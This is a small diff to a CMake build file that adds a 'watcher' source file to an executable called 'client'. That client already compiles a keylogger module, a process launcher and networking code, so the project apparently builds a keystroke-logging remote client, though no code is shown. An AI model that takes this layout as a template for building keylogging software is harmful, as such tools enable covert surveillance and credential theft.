@@ -24,6 +24,7 @@ add_executable(client
         client/main.c
         client/keylogging/keylogger.c
         client/process_launcher/process_launcher.c
+        client/watcher/watcher.c
         utils/utils.c
         networking/networking.c
         networking/protocol.c)
